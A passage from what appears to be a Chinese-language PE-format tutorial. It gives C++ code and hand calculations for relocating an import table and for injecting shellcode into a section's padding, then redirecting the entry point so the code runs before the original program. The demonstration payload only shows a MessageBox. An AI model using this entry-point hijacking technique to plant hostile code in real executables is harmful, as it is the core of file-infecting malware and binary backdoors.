dwDstOffset;DWORD dwNewImportTableRVA = 0;if (!FOAToRVA(dwNewImportTableFOA, dwNewImportTableRVA, lpNewBuffer))&#123; return FALSE;&#125;dwDstOffset += ImportTableSize; //更新dwDstOffset 指向新导入表，移动每张导入表下的INT表 1234567891011121314151617181920212223242526272829303132//2、指向新新导入表，遍历它，将所有INT表拷到新位置auto pNewImportDirectory = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)lpNewBuffer + dwNewImportTableFOA);while (pNewImportDirectory-&gt;OriginalFirstThunk &amp;&amp; pNewImportDirectory-&gt;FirstThunk)&#123; DWORD dwOriginalFirstThunk_FOA = 0; if (!RVAToFOA(pNewImportDirectory-&gt;OriginalFirstThunk, dwOriginalFirstThunk_FOA)) &#123; return FALSE; &#125; auto pINTTable = (PDWORD)((DWORD)lpNewBuffer + dwOriginalFirstThunk_FOA); BYTE count = 0; while (pINTTable[count]) &#123; ++count; &#125; DWORD dwINTTableSize = (count + 1) * sizeof(DWORD); // +1 for null terminator memcpy((PBYTE)((DWORD)lpNewBuffer + dwDstOffset), pINTTable, dwINTTableSize); DWORD dwNewINTTableFOA = dwDstOffset; DWORD dwNewINTTableRVA = 0; if (!FOAToRVA(dwNewINTTableFOA, dwNewINTTableRVA, lpNewBuffer)) &#123; return FALSE; &#125; dwDstOffset += dwINTTableSize; //更新dwDstOffset //修正导入表中OriginalFirstThunk指向 pNewImportDirectory-&gt;OriginalFirstThunk = dwNewINTTableRVA; ++pNewImportDirectory; //下一张导入表&#125; 指向新导入表，遍历INT表，处理提示名表；处理导入表Name字段 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667//3、遍历新导入表，遍历INT表，处理提示名表 + 处理导入表的Name字段pNewImportDirectory = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)lpNewBuffer + dwNewImportTableFOA); //回到第一张导入表while (pNewImportDirectory-&gt;OriginalFirstThunk &amp;&amp; pNewImportDirectory-&gt;FirstThunk)&#123; DWORD dwOriginalFirstThunk_FOA = 0; if (!RVAToFOA(pNewImportDirectory-&gt;OriginalFirstThunk, dwOriginalFirstThunk_FOA, lpNewBuffer)) &#123; return FALSE; &#125; auto pINTTable = (PDWORD)((DWORD)lpNewBuffer + dwOriginalFirstThunk_FOA); while (*pINTTable) &#123; if (IMAGE_SNAP_BY_ORDINAL(*pINTTable)) //最高位为1，序号方式输入 &#123; ; &#125; else //最高位为0，指向Hint-Name Table &#123; DWORD dwHintNameTableFOA = 0; if (!RVAToFOA(*pINTTable, dwHintNameTableFOA)) &#123; return FALSE; &#125; auto pHintNameTable = (PIMAGE_IMPORT_BY_NAME)((DWORD)lpNewBuffer + dwHintNameTableFOA); BYTE SizeOfHintNameTableItem = sizeof(pHintNameTable-&gt;Hint) + (strlen((PCHAR)pHintNameTable-&gt;Name) + 1); memcpy((PBYTE)((DWORD)lpNewBuffer + dwDstOffset), (PBYTE)pHintNameTable, SizeOfHintNameTableItem); DWORD dwNewHintNameTableFOA = dwDstOffset; DWORD dwNewHintNameTableRVA = 0; if (!FOAToRVA(dwNewHintNameTableFOA, dwNewHintNameTableRVA, lpNewBuffer)) &#123; return FALSE; &#125; dwDstOffset += SizeOfHintNameTableItem; //修正INT表项的指向 *pINTTable = dwNewHintNameTableRVA; &#125; ++pINTTable; //INT表下一项 &#125; //处理导入表的Name字段 DWORD dwNameFOA = 0; if (!RVAToFOA(pNewImportDirectory-&gt;Name, dwNameFOA)) &#123; return FALSE; &#125; auto cName = (PCHAR)((DWORD)lpNewBuffer + dwNameFOA); memcpy((PBYTE)((DWORD)lpNewBuffer + dwDstOffset), cName, strlen(cName) + 1); DWORD dwNewNameFOA = dwDstOffset; DWORD dwNewNameRVA = 0; if (!FOAToRVA(dwNewNameFOA, dwNewNameRVA, lpNewBuffer)) &#123; return FALSE; &#125; dwDstOffset += strlen(cName) + 1; //更新dwDstOffset pNewImportDirectory-&gt;Name = dwNewNameRVA; //修正导入表中Name字段指向 //下一张导入表 ++pNewImportDirectory; &#125; 更新数据目录表中的导入表地址指向 12//4、更新数据目录表中的导入表地址指向pOptionalPeHdr_NewBuffer-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress = dwNewImportTableRVA; 完整代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146BOOL PEManipulator::MoveImportTableToNewSection(LPVOID lpNewBuffer)&#123; //获取NewBuffer中相关的PE指针 auto pPeHdr_NewBuffer = GetPeHeader(lpNewBuffer); auto pOptionalPeHdr_NewBuffer = GetOptionPeHeaders(lpNewBuffer); auto pSecHdr_NewBuffer = GetSectionHeader(lpNewBuffer); if (!pPeHdr_NewBuffer || !pOptionalPeHdr_NewBuffer || !pSecHdr_NewBuffer) &#123; printf(&quot; [!] One or more PE Header pointers are invalid &quot;); return FALSE; &#125; // 获取导入表指针 auto pImportDirectory = (PIMAGE_IMPORT_DESCRIPTOR)GetDataDirectoryPointer(IMAGE_DIRECTORY_ENTRY_IMPORT, lpNewBuffer); if (!pImportDirectory) &#123; return FALSE; &#125; // 新节的起始位置 PIMAGE_SECTION_HEADER pNewSection = &amp;pSecHdr_NewBuffer[pPeHdr_NewBuffer-&gt;NumberOfSections - 1]; DWORD dwDstOffset = pNewSection-&gt;PointerToRawData; //1、统计导入表个数，随后将导入表移动到新位置 BYTE ImportTableCount = 0; while (pImportDirectory[ImportTableCount].OriginalFirstThunk &amp;&amp; pImportDirectory[ImportTableCount].FirstThunk) &#123; ++ImportTableCount; &#125; DWORD ImportTableSize = (ImportTableCount + 1) * sizeof(IMAGE_IMPORT_DESCRIPTOR); // +1 for null terminator memcpy((PBYTE)((DWORD)lpNewBuffer + dwDstOffset), pImportDirectory, ImportTableSize); DWORD dwNewImportTableFOA = dwDstOffset; DWORD dwNewImportTableRVA = 0; if (!FOAToRVA(dwNewImportTableFOA, dwNewImportTableRVA, lpNewBuffer)) &#123; return FALSE; &#125; dwDstOffset += ImportTableSize; //更新dwDstOffset //2、指向新新导入表，遍历它，将所有INT表拷到新位置 auto pNewImportDirectory = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)lpNewBuffer + dwNewImportTableFOA); while (pNewImportDirectory-&gt;OriginalFirstThunk &amp;&amp; pNewImportDirectory-&gt;FirstThunk) &#123; DWORD dwOriginalFirstThunk_FOA = 0; if (!RVAToFOA(pNewImportDirectory-&gt;OriginalFirstThunk, dwOriginalFirstThunk_FOA)) &#123; return FALSE; &#125; auto pINTTable = (PDWORD)((DWORD)lpNewBuffer + dwOriginalFirstThunk_FOA); BYTE count = 0; while (pINTTable[count]) &#123; ++count; &#125; DWORD dwINTTableSize = (count + 1) * sizeof(DWORD); // +1 for null terminator memcpy((PBYTE)((DWORD)lpNewBuffer + dwDstOffset), pINTTable, dwINTTableSize); DWORD dwNewINTTableFOA = dwDstOffset; DWORD dwNewINTTableRVA = 0; if (!FOAToRVA(dwNewINTTableFOA, dwNewINTTableRVA, lpNewBuffer)) &#123; return FALSE; &#125; dwDstOffset += dwINTTableSize; //更新dwDstOffset //修正导入表中OriginalFirstThunk指向 pNewImportDirectory-&gt;OriginalFirstThunk = dwNewINTTableRVA; ++pNewImportDirectory; //下一张导入表 &#125; //3、遍历新导入表，遍历INT表，处理提示名表 + 处理导入表的Name字段 pNewImportDirectory = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)lpNewBuffer + dwNewImportTableFOA); //回到第一张导入表 while (pNewImportDirectory-&gt;OriginalFirstThunk &amp;&amp; pNewImportDirectory-&gt;FirstThunk) &#123; DWORD dwOriginalFirstThunk_FOA = 0; if (!RVAToFOA(pNewImportDirectory-&gt;OriginalFirstThunk, dwOriginalFirstThunk_FOA, lpNewBuffer)) &#123; return FALSE; &#125; auto pINTTable = (PDWORD)((DWORD)lpNewBuffer + dwOriginalFirstThunk_FOA); while (*pINTTable) &#123; if (IMAGE_SNAP_BY_ORDINAL(*pINTTable)) //最高位为1，序号方式输入 &#123; ; &#125; else //最高位为0，指向Hint-Name Table &#123; DWORD dwHintNameTableFOA = 0; if (!RVAToFOA(*pINTTable, dwHintNameTableFOA)) &#123; return FALSE; &#125; auto pHintNameTable = (PIMAGE_IMPORT_BY_NAME)((DWORD)lpNewBuffer + dwHintNameTableFOA); BYTE SizeOfHintNameTableItem = sizeof(pHintNameTable-&gt;Hint) + (strlen((PCHAR)pHintNameTable-&gt;Name) + 1); memcpy((PBYTE)((DWORD)lpNewBuffer + dwDstOffset), (PBYTE)pHintNameTable, SizeOfHintNameTableItem); DWORD dwNewHintNameTableFOA = dwDstOffset; DWORD dwNewHintNameTableRVA = 0; if (!FOAToRVA(dwNewHintNameTableFOA, dwNewHintNameTableRVA, lpNewBuffer)) &#123; return FALSE; &#125; dwDstOffset += SizeOfHintNameTableItem; //修正INT表项的指向 *pINTTable = dwNewHintNameTableRVA; &#125; ++pINTTable; //INT表下一项 &#125; //处理导入表的Name字段 DWORD dwNameFOA = 0; if (!RVAToFOA(pNewImportDirectory-&gt;Name, dwNameFOA)) &#123; return FALSE; &#125; auto cName = (PCHAR)((DWORD)lpNewBuffer + dwNameFOA); memcpy((PBYTE)((DWORD)lpNewBuffer + dwDstOffset), cName, strlen(cName) + 1); DWORD dwNewNameFOA = dwDstOffset; DWORD dwNewNameRVA = 0; if (!FOAToRVA(dwNewNameFOA, dwNewNameRVA, lpNewBuffer)) &#123; return FALSE; &#125; dwDstOffset += strlen(cName) + 1; //更新dwDstOffset pNewImportDirectory-&gt;Name = dwNewNameRVA; //修正导入表中Name字段指向 //下一张导入表 ++pNewImportDirectory; &#125; //4、更新数据目录表中的导入表地址指向 pOptionalPeHdr_NewBuffer-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress = dwNewImportTableRVA; printf(&quot;[+] Import table successfully moved and fixed. &quot;); return TRUE;&#125; 运行结果 运行修改后的exe，正常运行 PE Tools对比两个exe的导入表"},{"title":"空白区添加代码","path":"/wiki/PE/空白区添加代码.html","content":"空白区：DOS部分+PE头+节表与第一个节数据之间的padding区域、节数据与节数据之间的padding区域 步骤： 准备要添加的代码 注意要添加的代码中的call/jmp指令后面跟的是偏移地址，要添加后再计算 执行完添加的代码后回到程序原本的OEP执行 在PE的空白区填写构造的这段代码 修改PE文件的AddressOfEntryPoint为构造的代码 效果：运行程序，程序先执行构造的代码-&gt;程序原本的OEP 下面以添加Messagebox代码为例，来展示这个过程 知识补充 获取系统API的地址 注：系统API地址重启电脑后地址会变 方式一：OD在user32.dll中查找MessageBoxA函数地址方式二：IDE调试步进MessageBoxA随意拖进一个exe，点击上方的E按钮，查看所有的模块。双击USER32.dll那行，按Ctrl+N，找MessageBoxA 1234567#include &lt;Windows.h&gt;int main()&#123;\tMessageBoxA(0, 0, 0, 0);\treturn 0;&#125; call和jmp指令后偏移地址的计算 call和jmp指令后跟的是到目的地址的相对位移（偏移值），而不是目标地址（绝对地址）。 以call指令（硬编码E8）为例来讲偏移地址怎么算： 公式： 偏移值=要跳转的目的地址−(当前call指令地址+当前call指令长度)偏移值=要跳转的目的地址−(当前call指令地址+当前call指令长度) 偏移值=要跳转的目的地址−(当前call指令地址+当前call指令长度) 如果当前call指令长度是5个字节 偏移值=要跳转的目的地址−(当前call指令地址+5)偏移值=要跳转的目的地址−(当前call指令地址+5) 偏移值=要跳转的目的地址−(当前call指令地址+5) 公式推导过程要跳转的目的地址=call指令下一条指令地址+偏移值...①要跳转的目的地址=call指令下一条指令地址+偏移值...①要跳转的目的地址=call指令下一条指令地址+偏移值...①接着，因为call指令下一条指令的地址等于当前call指令地址加上当前call指令的长度（EIP也是通过这种方式来更新的），将这个关系代入上面的公式中，得到：要跳转的目的地址=(当前call指令地址+当前call指令长度)+偏移值...②要跳转的目的地址=(当前call指令地址+当前call指令长度)+偏移值...②要跳转的目的地址=(当前call指令地址+当前call指令长度)+偏移值...②对式子②变形，就得到上面的公式EIP更新也是通过当前指令地址+当前指令长度来更新的在计组的知识中，我们知道CPU根据EIP取指执行，取指执行，EIP就是通过当前指令地址+当前指令长度，自动更新为下一条指令的地址。 call/jmp指令后为什么跟的是相对地址答：用相对值的话，方便程序在内存中的浮动装配。详见《汇编语言4th-王爽》另外，偏移值=要跳转的目标地址-下一条指令地址计算出来的数是个补码，用有符号数来看待：如果是正数，表示要跳转的目标地址在下一条指令地址下面，也就是说要跳转的目标地址（高地址）-下一条指令地址（低地址）如果是负数，表示要跳转的目标地址在下一条指令地址上面，也就是说要跳转的目标地址（低地址）-下一条指令地址（高地址） 计算偏移的细节 上面说了计算call/jmp指令偏移值的公式是： 偏移值=要跳转的目的地址−(当前call指令地址+5)偏移值=要跳转的目的地址−(当前call指令地址+5) 偏移值=要跳转的目的地址−(当前call指令地址+5) 但要注意PE文件分文件状态和内存状态，我们说的指令地址是指内存运行时的状态（要加ImageBase）。 手动实现 目标PE及相关字段：ipmsg.exe 字段 值 FileAlignment 1000h SectionAlignment 1000h ImageBase 400000h AddressOfEntryPoint 183D7h 构造要写入的代码为MessageBoxA(0, 0, 0, 0) 1234567#include &lt;Windows.h&gt;int main()&#123;\tMessageBoxA(0, 0, 0, 0);\treturn 0;&#125; 这个函数本质就是一段硬编码 123456789101112131415\t0x6A, 0x00, 0x6A, 0x00, 0x6A, 0x00, 0x6A, 0x00, 0xE8, 0x00, 0x00, 0x00, 0x00, 0xE9, 0x00, 0x00, 0x00, 0x00\t/*\tpush 0\tpush 0\tpush 0\tpush 0\tcall 00000000 偏移地址待算\tjmp 00000000 偏移地址待算*/ 获取MessageBoxA的地址（在这次实验中的地址是771B0D80）。 注：系统API地址重启电脑后会变；此地址仅对于笔者的电脑环境有效。 call指令后的偏移计算 这次的实验不用导入表的间接call（硬编码FF），而是用直接call（硬编码E8）。 假设我们将这段代码从ipmsg.exe程序的1A730h地址开始写： E8指令地址为：1A738h 根据公式：偏移值=要跳转的目的地址−(当前call指令地址+5) 偏移值 =MessageBoxA函数的地址 - 内存中call指令的地址-5 =771B0D80h-(ImageBase+1A738h)-5 =771B0D80h-(0x400000h+1A738h)-5 =76d96643h 这里ipmsg的文件对齐和内存对齐值一样，所以call指令在内存中的RVA就是FOA 那么call指令跟的偏移地址就是（注意小端序） 10xE8, 0x43, 0x66, 0xD9, 0x76,\t//call jmp指令后的偏移计算 E9指令地址为：1A73dh 根据公式：偏移值=要跳转的目的地址−(当前jmp指令地址+5) 偏移值 =OEP-内存中jmp指令的地址 - 5 =(ImageBase+AddressOfEntryPoint) - (ImageBase+jmp指令在内存中的RVA地址) - 5 =AddressOfEntryPoint - jmp指令在内存中的RVA地址 - 5 =183D7h - 1a73dh - 5 =FFFFDC95h （这里ipmsg的文件对齐和内存对齐值一样，所以jmp指令在内存中的RVA就是FOA） 那么jmp指令跟的偏移地址就是（注意小端序） 10xE9, 0x95, 0xDC, 0xFF, 0xFF,\t//jmp 修改AddressOfEntryPoint 添加的指令的FOA是1a730h，去将AddressOfEntryPoint改为这个值 注意小端序： 130 a7 01 00 执行 执行效果：先弹MessageBoxA，然后执行ipmsg程序本身 如果有错误用OD打开检查一下（地址很容易算错，多检查） 在headers和第一个节数据之间加这段shellcode，会报错； 在节与节之间就可以，也不用改属性为可执行 原因不知 编程实现 方式一方式二方式一直接在FileBuffer基础上添加shellcode，这会涉及FOAToRVA的换算 为文件创建FileBuffer内存映像 在FileBuffer上添加shellcode 会涉及RVAToFOA的换算 脑海中要有该PE加载到ImageBase为0x00400000时的样子 存盘 在ImageBuffer基础上添加shellcode，然后再压缩存盘。因为是拉伸然后再压缩，就不涉及FOA和RVA的换算 为文件创建FileBuffer内存映像 将FileBuffer拉伸为ImageBuffer，在ImageBuffer基础上添加shellcode 脑海中要有该PE加载到ImageBase(0x00400000)时的样子（算指令地址会涉及到这个状态） 将ImageBuffer压缩为NewFileBuffer 存盘 起始指针 备注 文件 FileBuffer pFileBuffer 起始地址为pFileBuffer ImageBuffer pImageBuffer 起始地址为pImageBuffer 运行时的PE文件 起始地址为ImageBase NewFileBuffer 存盘 AddShellcode函数 准备shellcode，call和jmp后的偏移地址后面算，因为取决于这段shellcode放哪 12345678910111213141516171819// Shellcode to be added to the PE file.BYTE g_ShellCode[] =&#123;\t0x6A, 0x00,\t0x6A, 0x00,\t0x6A, 0x00,\t0x6A, 0x00,\t0xE8, 0x00, 0x00, 0x00, 0x00,\t0xE9, 0x00, 0x00, 0x00, 0x00\t/* push 0 push 0 push 0 push 0 call 00000000 偏移地址待算 jmp 00000000 偏移地址待算\t*/&#125;; 选择一个节添加shellcode，判断该节是否有足够的空间放shellcode 节.SizeOfRawData-节.VirtualSize表这个节剩余空间，和shellcode长度对比。(SizeOfRawData总空间，VirtualSize实际用到的空间) 如果剩余空间&lt;shellcoe长度，说明放不下 123456//Check if there is enough space in the section to add the shellcodeif ((pTargetSection-&gt;SizeOfRawData - pTargetSection-&gt;Misc.VirtualSize)&lt; ShellCodeLength)&#123;\tprintf(&quot;The target section doesn&#x27;t have enough space for the shellcode.&quot;);\treturn FALSE;&#125; 这段代码其实有问题用VirtualSize&gt;SizeOfRawData的节去测试时，发现还是添加了shellcode调试发现编译器将VirtualSize和SizeOfRawData都当成了无符号数unsigned long，DWORD的别名就是unsigned long。因为两个数都是无符号数，如果用从较小的VirtualSize减去较大的SizeOfRawData时，由于无符号整数不表示负数，结果会发生整数下溢，导致得到一个非常大的数，而不是一个负数。如果要正确处理VirtualSize&gt;SizeOfRawData的情况，可以分步判断：VirtualSize和SizeOfRawData做大小比较如果VirtualSize≥SizeOfRawData，没剩余空间，返回错误如果VirtualSize小SizeOfRawData，计算剩余空间剩余空间和shellcode长度比较剩余空间≥shellcode长度，放得下，添加shellcode剩余空间＜shellcode长度，放不下，返回错误修改后的代码：123456789101112if (pTargetSection-&gt;VirtualSize &gt;= pTargetSection-&gt;SizeOfRawData) &#123;\tprintf(&quot;The target section doesn&#x27;t have enough space for the shellcode. &quot;);\treturn FALSE;&#125; DWORD availableSpace = pTargetSection-&gt;SizeOfRawData - pTargetSection-&gt;Misc.VirtualSize;if (availableSpace &lt; ShellCodeLength) &#123;\tprintf(&quot;The target section doesn&#x27;t have enough space for the shellcode. &quot;);\treturn FALSE;&#125; 开始放shellcode 假设shellcode放在紧跟节.VirtualSize的位置，那么位置就是DWORD(pImageBuffer)+节.VirtualAddress+节.VirtualSize 12345DWORD shellCodeRVA = pTargetSection-&gt;VirtualAddress + pTargetSection-&gt;Misc.VirtualSize;PBYTE ShellCodeBegin = (PBYTE)((DWORD)pImageBuffer + shellCodeRVA); // Copy the shellcode to the section (节.VirtualAddress + 节.VirtualSize).memcpy(ShellCodeBegin, g_ShellCode, ShellCodeLength); 算call后的偏移地址，然后修正pImageBuffer中call指令的地址 要跳转的地址：动态获取跳转函数MessageBoxA的函数地址 12HMODULE hModule = LoadLibraryA(&quot;User32.dll&quot;);DWORD FuncAddress = (DWORD)GetProcAddress(hModule, &quot;MessageBoxA&quot;); 计算公式：偏移量 = 跳转的地址 - 下一条指令地址 注意：下一条指令地址是PE文件运行时的地址 1234\t//计算call指令跟的偏移地址DWORD callRelativeAddr = FuncAddress-(pImageOptionalHeader-&gt;ImageBase + shellCodeRVA + 0xD); //偏移量=跳转地址-call指令下一行地址\t//修正ImageBuffer中call后的地址*(PDWORD)(ShellCodeBegin + 0x9) = callRelativeAddr; 算jmp后的偏移地址，然后修正pImageBuffer中jmp指令的地址 要跳转的地址为原OEP(ImageBase+AddressOfEntryPoint) 12 //原OEPDWORD originalEntryPointRVA = pImageOptionalHeader-&gt;ImageBase + pImageOptionalHeader-&gt;AddressOfEntryPoint; 计算公式：偏移量 = 跳转的地址 - 下一条指令地址 注意：下一条指令地址是PE文件运行时的地址 1234 //计算jmp指令跟的偏移地址DWORD jmpRelativeAddr = originalEntryPointRVA - (pImageOptionalHeader-&gt;ImageBase + shellCodeRVA + 0x12); //偏移量=跳转地址-jmp指令下一行地址 //修正ImageBuffer中jmp后的地址*(PDWORD)(ShellCodeBegin + 0xE) = jmpRelativeAddr; 将原来的AddressOfEntryPoint修改为shellcode起始地址（这是个RVA值） 12// Update the AddressOfEntryPoint to point to the shellcode.pImageOptionalHeader-&gt;AddressOfEntryPoint = shellCodeRVA; 增加的功能 ChooseSectionToAddShellCode函数：依次输出每个节的Name和是否可执行属性，让用户输入，选择哪个节来添加shellcode 1234567891011121314151617181920212223242526272829303132333435363738//输出各个节表的Name，以及是否可执行PIMAGE_SECTION_HEADER pTempImageSectionHeader = pSectionHeader; //遍历节表用的for (int i = 0; i &lt; numberOfSections; i++, pTempImageSectionHeader++)&#123;\t//输出Name，确保节名称占用8个字符宽度\tchar SectionName[9]; //节名称最大8个字符 + 1个空字符\tstrncpy(SectionName, (const char*)pTempImageSectionHeader-&gt;Name, 8);\tSectionName[8] = &#x27;\\0&#x27;; // 确保字符串以空字符结尾\t// 输出是否可执行，并且对输出做对齐处理\tBOOL isExecutable = (pSectionHeader[i].Characteristics &amp; IMAGE_SCN_MEM_EXECUTE) != 0;\tprintf(&quot; %d: %-10s Executable: %s &quot;, i, SectionName, isExecutable ? &quot;Yes&quot; : &quot;No&quot;);&#125;//输入及错误检查int chosenSection = -1;BOOL validInput = FALSE;while (!validInput) &#123;\tprintf(&quot;Enter the section number to add the shellcode to (0 to %d): &quot;, numberOfSections - 1);\tif (scanf(&quot;%d&quot;, &amp;chosenSection) == 1) &#123; // 确保读取到一个整数 if (chosenSection &gt;= 0 &amp;&amp; chosenSection &lt; numberOfSections) &#123; validInput = TRUE; // 输入有效 &#125; else &#123; printf(&quot;Invalid section number. Please try again. &quot;); &#125;\t&#125;\telse &#123; // 清除错误的输入 while (getchar() != &#x27; &#x27;); printf(&quot;Invalid input. Please enter a number. &quot;);\t&#125;&#125; AddShellcode.cpp中，调用ChooseSectionToAddShellCode函数让用户选择哪个节取添加shellcode 如果选择的节的Characteristics字段没有可执行权限，就增加可执行权限 123456789// choose section to add the shellcodeint chosenSection = ChooseSectionToAddShellCode(pImageSectionHeader, pImageFileHeader-&gt;NumberOfSections);PIMAGE_SECTION_HEADER pTargetSection = pImageSectionHeader + chosenSection;\t// Check if the chosen section has executable permissions，if not ,add itif (!(pTargetSection-&gt;Characteristics &amp; IMAGE_SCN_MEM_EXECUTE)) &#123;\tprintf(&quot;The chosen section is not executable. Modifying section characteristics to add executable permission. &quot;);\tpTargetSection-&gt;Characteristics |= IMAGE_SCN_MEM_EXECUTE;&#125; 代码清单 文件名 函数功能 AddShellcode.h和AddShellcode.cpp 添加shellcode ChooseSectionToAddShellCode.h和ChooseSectionToAddShellCode.cpp 依次打印节的序号、名字以及是否具备可执行属性让用户选择哪个节来添加shellcode Global.h和Global.cpp 其他函数：GetFileSizeReadFileToFileBufferFileBufferToImageBufferImageBufferToNewFileBufferMemoryToFile main.cpp 主函数 main.cpp AddShellcode.hAddShellcode.cppChooseSectionToAddShellCode.hChooseSectionToAddShellCode.cppGlobal.hGlobal.c1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;#include &quot;Global.h&quot;#include &quot;AddShellcode.h&quot;#define INPUT_FILE_PATH &quot;E:\\\\temp\\\\fg.exe&quot;#define OUTPUT_FILE_PATH &quot;E:\\\\temp\\\\fg_added_shellcode.exe&quot;int main()&#123;\t//将文件读入内存，创建文件内存映像FileBuffer\tsize_t length;\tvoid* FileBuffer = ReadFileToFileBuffer(INPUT_FILE_PATH, &amp;length);\tif (NULL == FileBuffer)\t&#123; printf(&quot;ReadFileToFileBuffer failed &quot;); return 0;\t&#125;\t//FileBuffer-&gt;ImageBuffer，拉伸\tDWORD SizeOfImageBuffer;\tvoid* ImageBuffer;\tImageBuffer = FileBufferToImageBuffer((char*)FileBuffer, &amp;SizeOfImageBuffer);\tif (NULL == ImageBuffer)\t&#123; printf(&quot;FileBufferToImageBuffer failed &quot;); free(FileBuffer); return 0;\t&#125;\t//对PE文件增加ShellCode\tBOOL ret = AddShellCodeToPE(ImageBuffer);\tif (!ret)\t&#123; printf(&quot;AddShellCodeToPE failed &quot;); free(FileBuffer); free(ImageBuffer); return 0;\t&#125;\telse\t&#123; printf(&quot;AddShellCodeToPE succeed &quot;);\t&#125;\t//ImageBuffer-&gt;NewFileBuffer，压缩\tDWORD SizeOfNewFileBuffer;\tvoid* NewFileBuffer;\tNewFileBuffer = ImageBufferToNewFileBuffer((char*)ImageBuffer, &amp;SizeOfNewFileBuffer);\tif (NULL == NewFileBuffer)\t&#123; printf(&quot;ImageBufferToNewFileBuffer failed &quot;); free(FileBuffer); free(ImageBuffer); return 0;\t&#125;\t//将内存中的数据写到文件中\tif (!MemoryToFile((char*)NewFileBuffer, SizeOfNewFileBuffer, OUTPUT_FILE_PATH))\t&#123; printf(&quot;MemoryToFile failed &quot;); free(FileBuffer); free(ImageBuffer); free(NewFileBuffer); return 0;\t&#125;\telse\t&#123; printf(&quot;MemoryToFile succeed &quot;);\t&#125;\t// 使用完毕后，释放内存\tfree(FileBuffer);\tfree(ImageBuffer);\tfree(NewFileBuffer);\treturn 0;&#125;1234567#pragma once#include &lt;Windows.h&gt;// extern to avoid multiple definitions.extern BYTE g_ShellCode[];BOOL AddShellCodeToPE(void* pBuffer);12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394#include &quot;ChooseSectionToAddShellCode.h&quot;#include &quot;AddShellcode.h&quot;#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;// Shellcode to be added to the PE file.BYTE g_ShellCode[] =&#123;\t0x6A, 0x00,\t0x6A, 0x00,\t0x6A, 0x00,\t0x6A, 0x00,\t0xE8, 0x00, 0x00, 0x00, 0x00,\t0xE9, 0x00, 0x00, 0x00, 0x00\t/* push 0 push 0 push 0 push 0 call 00000000 偏移地址待算 jmp 00000000 偏移地址待算\t*/&#125;;BOOL AddShellCodeToPE(void* pImageBuffer)&#123;\tconst DWORD ShellCodeLength = sizeof(g_ShellCode);\tPIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pImageBuffer;\tPIMAGE_NT_HEADERS32 pImageNTHeaders32 = (PIMAGE_NT_HEADERS32)((DWORD)pDosHeader + pDosHeader-&gt;e_lfanew);\tPIMAGE_FILE_HEADER pImageFileHeader = (PIMAGE_FILE_HEADER)((DWORD)pImageNTHeaders32 + 4);\tPIMAGE_OPTIONAL_HEADER32 pImageOptionalHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pImageFileHeader + IMAGE_SIZEOF_FILE_HEADER);\tPIMAGE_SECTION_HEADER pImageSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pImageOptionalHeader + pImageFileHeader-&gt;SizeOfOptionalHeader);\t//1、 choose section to add the shellcode\tint chosenSection = ChooseSectionToAddShellCode(pImageSectionHeader, pImageFileHeader-&gt;NumberOfSections);\tPIMAGE_SECTION_HEADER pTargetSection = pImageSectionHeader + chosenSection;\t//2、Check if there is enough space in the section to add the shellcode //if ((pTargetSection-&gt;SizeOfRawData - pTargetSection-&gt;Misc.VirtualSize) &lt; ShellCodeLength) //&#123; //\tprintf(&quot;The target section doesn&#x27;t have enough space for the shellcode.&quot;); //\treturn FALSE; //&#125;\tif (pTargetSection-&gt;Misc.VirtualSize &gt;= pTargetSection-&gt;SizeOfRawData) &#123; printf(&quot;The target section doesn&#x27;t have enough space for the shellcode. &quot;); return FALSE;\t&#125;\tDWORD availableSpace = pTargetSection-&gt;SizeOfRawData - pTargetSection-&gt;Misc.VirtualSize;\tif (availableSpace &lt; ShellCodeLength) &#123; printf(&quot;The target section doesn&#x27;t have enough space for the shellcode. &quot;); return FALSE;\t&#125; // Check if the chosen section has executable permissions，if not ,add it\tif (!(pTargetSection-&gt;Characteristics &amp; IMAGE_SCN_MEM_EXECUTE)) &#123; printf(&quot;The chosen section is not executable. Modifying section characteristics to add executable permission. &quot;); pTargetSection-&gt;Characteristics |= IMAGE_SCN_MEM_EXECUTE;\t&#125; DWORD shellCodeRVA = pTargetSection-&gt;VirtualAddress + pTargetSection-&gt;Misc.VirtualSize;\tPBYTE ShellCodeBegin = (PBYTE)((DWORD)pImageBuffer + shellCodeRVA);\t//3、 Copy the shellcode to the section (节.VirtualAddress + 节.VirtualSize).\tmemcpy(ShellCodeBegin, g_ShellCode, ShellCodeLength);\t//4、 fix the call and jmp instruction address\t//(1) Calculate and fix the call instruction address. //动态获取本机的MessageBoxA函数地址\tHMODULE hModule = LoadLibraryA(&quot;User32.dll&quot;);\tDWORD FuncAddress = (DWORD)GetProcAddress(hModule, &quot;MessageBoxA&quot;); //计算call指令跟的偏移地址\tDWORD callRelativeAddr = FuncAddress-(pImageOptionalHeader-&gt;ImageBase + shellCodeRVA + 0xD); //偏移量=跳转地址-call指令下一行地址 //修正ImageBuffer中call后的地址\t*(PDWORD)(ShellCodeBegin + 0x9) = callRelativeAddr;\t//(2) Calculate and fix the jmp instruction address. //原OEP\tDWORD originalEntryPointRVA = pImageOptionalHeader-&gt;ImageBase + pImageOptionalHeader-&gt;AddressOfEntryPoint; //计算jmp指令跟的偏移地址\tDWORD jmpRelativeAddr = originalEntryPointRVA - (pImageOptionalHeader-&gt;ImageBase + shellCodeRVA + 0x12); //偏移量=跳转地址-jmp指令下一行地址 //修正ImageBuffer中jmp后的地址\t*(PDWORD)(ShellCodeBegin + 0xE) = jmpRelativeAddr;\t//5、 Update the AddressOfEntryPoint to point to the 